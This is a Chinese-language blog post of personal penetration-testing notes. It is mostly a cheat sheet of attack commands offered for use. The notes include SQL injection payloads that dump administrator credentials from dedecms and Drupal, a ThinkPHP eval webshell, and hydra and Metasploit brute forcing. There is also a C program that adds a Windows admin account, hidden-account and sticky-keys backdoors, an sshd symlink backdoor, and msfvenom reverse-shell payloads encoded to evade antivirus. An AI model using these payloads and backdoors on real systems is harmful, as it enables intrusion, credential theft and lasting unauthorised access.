<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内网渗透笔记 | Dawn_whisper's blog</title><meta name="keywords" content="Web"><meta name="author" content="Dawn_whisper"><meta name="copyright" content="Dawn_whisper"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内网渗透笔记大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（  信息收集nmap1234567-P 指定扫描端口-O 操作系统检测-A 操作系统版本检测-PE&#x2F;PP&#x2F;PM 使用ICMP echo&#x2F;ICMP timestamp&#x2F;ICMP netmask请求包发现主机-PS&#x2F;PA&#x2F;PU&#x2F;PY 使用TCP SYN&#x2F;TCP ACK&#x2F;SCTP INIT&#x2F;ECH">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透笔记">
<meta property="og:url" content="http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Dawn_whisper&#39;s blog">
<meta property="og:description" content="内网渗透笔记大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（  信息收集nmap1234567-P 指定扫描端口-O 操作系统检测-A 操作系统版本检测-PE&#x2F;PP&#x2F;PM 使用ICMP echo&#x2F;ICMP timestamp&#x2F;ICMP netmask请求包发现主机-PS&#x2F;PA&#x2F;PU&#x2F;PY 使用TCP SYN&#x2F;TCP ACK&#x2F;SCTP INIT&#x2F;ECH">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/top_img.jpg">
<meta property="article:published_time" content="2022-07-13T02:58:41.000Z">
<meta property="article:modified_time" content="2022-07-14T08:30:58.000Z">
<meta property="article:author" content="Dawn_whisper">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/top_img.jpg"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":false,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Dawn_whisper","link":"链接: ","source":"来源: Dawn_whisper's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-07-14 16:30:58'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Dawn_whisper's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/comment/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></li><li><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/top_img.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Dawn_whisper's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/comment/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></li><li><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-13T02:58:41.000Z" title="发表于 2022-07-13 10:58:41">2022-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-14T08:30:58.000Z" title="更新于 2022-07-14 16:30:58">2022-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内网渗透笔记"><a href="#内网渗透笔记" class="headerlink" title="内网渗透笔记"></a>内网渗透笔记</h1><p>大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（</p>
<hr>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-P 指定扫描端口</span><br><span class="line">-O 操作系统检测</span><br><span class="line">-A 操作系统版本检测</span><br><span class="line">-PE/PP/PM 使用ICMP echo/ICMP timestamp/ICMP netmask请求包发现主机</span><br><span class="line">-PS/PA/PU/PY 使用TCP SYN/TCP ACK/SCTP INIT/ECHO方式进行发现</span><br><span class="line">-sV 服务版本扫描</span><br><span class="line">-sn xxx.xxx.xxx.xxx/24 C段扫描</span><br></pre></td></tr></table></figure>

<h3 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h3><blockquote>
<p>如果存在&#x2F;.git页面则存在git泄露</p>
</blockquote>
<p>GitHack</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://192.168.xxx.xxx/.git</span><br></pre></td></tr></table></figure>

<h3 id="svn泄露"><a href="#svn泄露" class="headerlink" title=".svn泄露"></a>.svn泄露</h3><blockquote>
<p>如果存在&#x2F;.svn页面则存在svn泄露</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://192.168.xxx.xxx/.svn --dump</span><br></pre></td></tr></table></figure>

<h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>intruder爆破</p>
<h3 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h3><p>subDomainsBrute 子域名枚举</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 subDomainsBrute.py xxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>搜索引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site: xxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>Sublist3r-master 第三方聚合服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sublist3r.py -d xxxxxx -o xxxxxx.txt</span><br></pre></td></tr></table></figure>

<p>证书透明信息 <a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a></p>
<h3 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h3><blockquote>
<ol>
<li><p>ping</p>
</li>
<li><p>nslookup</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup xxxxxxx 8.8.8.8</span><br><span class="line">nslookup xxxxxxx 114.114.114.114</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>等</li>
</ol>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>nikto 扫描器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>sqlmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxxxxx --level 3</span><br></pre></td></tr></table></figure>

<h3 id="弱口令扫描"><a href="#弱口令扫描" class="headerlink" title="弱口令扫描"></a>弱口令扫描</h3><p>Hydra</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l 指定单个用户名</span><br><span class="line">-L 指定多个用户名文件</span><br><span class="line">-P 指定多个密码文件</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -U ssh</span><br><span class="line">hydra xxx.xxx.xxx.xxx ssh -l root -P <span class="string">&#x27;xxxxxxxxxx&#x27;</span> -V</span><br></pre></td></tr></table></figure>

<p>Metasploit</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole 进入metasploit</span><br><span class="line">search ssh_login 搜索相关模块</span><br><span class="line">use xxxxxxxxxxxxxxx 使用某模块</span><br><span class="line">show options 展示配置参数</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> user_file /root/user.txt</span><br><span class="line"><span class="built_in">set</span> pass_file /root/pass.txt</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">intext: 正文关键字</span><br><span class="line">intitle: 标题关键字</span><br><span class="line">allintitle: 多个标题关键字</span><br><span class="line">inurl: url关键字</span><br><span class="line">allinurl: 多个url关键字</span><br><span class="line">site: 指定访问站点</span><br><span class="line">filetype: 文件类型</span><br><span class="line">link: 指定链接</span><br><span class="line">related: 布局相似</span><br><span class="line">cache: 谷歌快照</span><br><span class="line">info: 指定信息</span><br><span class="line">define: 词语定义</span><br><span class="line">phonebook: 电话信息</span><br><span class="line">Index of: 发现允许目录浏览的web网站</span><br></pre></td></tr></table></figure>

<h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p>搜索引擎</p>
<h3 id="系统漏洞扫描"><a href="#系统漏洞扫描" class="headerlink" title="系统漏洞扫描"></a>系统漏洞扫描</h3><p>Nessus</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nessusd start</span><br><span class="line">netstat -ntpl | grep nessus</span><br></pre></td></tr></table></figure>

<p>本地访问即可</p>
<p>MetaSploitFramework</p>
<p>同上利用即可</p>
<h2 id="web渗透测试"><a href="#web渗透测试" class="headerlink" title="web渗透测试"></a>web渗透测试</h2><h3 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h3><p>测试payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/plus/search.php?keyword[ uNion ]=a</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Request Error step 1 !</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/search.php?keyword=as&amp;typeArr[111%3D@`\&#x27;`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\&#x27;`+]=a</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>Request Error step 2 !</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/search.php?keyword=as&amp;typeArr[111%3D@`\&#x27;`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\&#x27;`+]=a</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="Drupalcms"><a href="#Drupalcms" class="headerlink" title="Drupalcms"></a>Drupalcms</h3><p>sql注入payload</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT table_name FROM information_schema.tables WHERE table_schema like database() limit 70,1)),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema like database()and table_name like ‘users’ )),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure>

<p>爆内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,substring((SELECT group_concat(name,’’,pass) FROM users),1,60)),0)%23]=bob&amp;name[0]=alol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema like database()and table_name like ‘users’ )),0)%23]=bob&amp;name[0]=a</span><br></pre></td></tr></table></figure>

<h3 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h3><p>略</p>
<h3 id="ThinkPHP2"><a href="#ThinkPHP2" class="headerlink" title="ThinkPHP2"></a>ThinkPHP2</h3><p>路由解析问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/index.php?s=a/b/c/$&#123;@phpinfo()&#125;</span><br><span class="line">http://xxx.xxx.xxx.xxx/index.php?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻防技术"><a href="#攻防技术" class="headerlink" title="攻防技术"></a>攻防技术</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>注就完了</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>略</p>
<h3 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h3><p>http协议覆盖绕过（编码等）</p>
<p>pipline绕过（一次发俩包）</p>
<p>分块传输绕过（把post部分分块）</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h4><p>在root的SUID下的程序里调用cat，新建一个cat，写进去shell，再把环境变量写在前面去，然后回去运行，即可拿到shell</p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure>

<h4 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h4><p>搜就完事</p>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>利用find可以执行其他命令等</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="PATH环境变量配置错误"><a href="#PATH环境变量配置错误" class="headerlink" title="PATH环境变量配置错误"></a>PATH环境变量配置错误</h4><p>exp.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    i=system(<span class="string">&quot;net user as Admin@123. /add&quot;</span>);</span><br><span class="line">    j=system(<span class="string">&quot;net localgroup administrator as /add&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc exp.c -o Common.exe -mwindows</span><br></pre></td></tr></table></figure>

<p>编译成<code>ipconfig.exe</code>丢入PATH下，执行命令即可</p>
<h4 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h4><p>把上面的exp编译成<code>Common.exe</code>，放在含有空格的地方等待重启即可</p>
<h4 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h4><p>写入<code>restart.bat</code>里等</p>
<h3 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h3><h4 id="Serv-U"><a href="#Serv-U" class="headerlink" title="Serv-U"></a>Serv-U</h4><p>exp直接入（</p>
<p>先修改<code>ServUDaemon.ini</code>注册文件，直接加个用户上去，然后ftp连接加进管理员<code>hack</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site <span class="built_in">exec</span> net user hack Admin@123. /add</span><br><span class="line">quote site <span class="built_in">exec</span> net localgroup administrators hack /add</span><br></pre></td></tr></table></figure>

<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h4><p>在用户名称后面加$即可隐藏</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hack$ 123456Pp. /add &amp;&amp; net localgroup administrators hack$ /add</span><br></pre></td></tr></table></figure>

<p>可去<code>管理/配置/本地用户和组/用户</code>中查看</p>
<h4 id="编辑注册表"><a href="#编辑注册表" class="headerlink" title="编辑注册表"></a>编辑注册表</h4><p>从注册表里导出，替换F字段的值，下次直接导入注册表即可</p>
<h4 id="shilft后门"><a href="#shilft后门" class="headerlink" title="shilft后门"></a>shilft后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span><br></pre></td></tr></table></figure>

<p>覆盖掉粘滞快捷键即可</p>
<h4 id="Windows隐藏文件"><a href="#Windows隐藏文件" class="headerlink" title="Windows隐藏文件"></a>Windows隐藏文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attrib test.txt +s +h</span><br><span class="line">attrib test.txt -s -h -r</span><br></pre></td></tr></table></figure>

<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>注册表启动键值、Windows启动项、Windows计划任务、sc命令创建新服务</p>
<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="SSHD软连接"><a href="#SSHD软连接" class="headerlink" title="SSHD软连接"></a>SSHD软连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config | grep UsePAM</span><br><span class="line"><span class="built_in">mkdir</span> /run/sshd</span><br><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1234</span><br></pre></td></tr></table></figure>

<p>等</p>
<h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><p>启动项、计划任务、SUID后门、公钥免密登陆、Strace后门、进程注入</p>
<h3 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h3><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>编码器免杀</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai -b “\x00” -i 16 -f exe -o test.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw |msfvenom -e x86/countdown -a x86 --platform windows -i 10  -f exe -o test1.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai-x /root/nppInstaller.exe -i 5 -f exe -o nppinstaller2.exe</span><br></pre></td></tr></table></figure>

<p>upx套壳</p>
